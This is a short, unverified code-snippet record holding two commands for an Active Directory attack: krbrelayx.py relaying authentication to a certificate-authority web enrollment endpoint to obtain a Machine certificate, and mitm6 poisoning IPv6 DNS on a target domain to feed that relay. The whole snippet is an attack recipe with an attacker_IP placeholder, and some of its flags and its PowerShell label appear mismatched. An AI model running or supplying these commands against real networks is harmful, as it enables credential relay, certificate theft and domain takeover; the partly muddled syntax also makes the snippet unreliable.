---
id: 0d47e1e1-2354-4c10-9aad-4ef884aee1da
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:05.989344+00:00'
updated_at: '2023-04-10T20:26:16.815025+00:00'
---

# Code Snippet 0d47e1e1

**Language**: ps1

```ps1
# Setup the relay
sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine

# Run mitm6
sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
```


